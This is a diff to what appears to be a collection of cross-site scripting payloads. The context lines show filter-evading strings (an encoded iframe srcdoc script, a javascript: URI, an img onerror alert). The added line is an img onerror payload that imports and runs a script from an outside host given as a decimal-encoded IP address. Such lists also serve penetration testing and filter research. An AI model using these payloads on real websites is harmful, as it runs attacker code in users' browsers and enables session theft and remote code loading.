@@ -19,3 +19,5 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 javascript:{ alert`0` }
 
 1'"><img/src/onerror=.1|alert``>
+
+<img src=x onError=import('//1152848220/')>
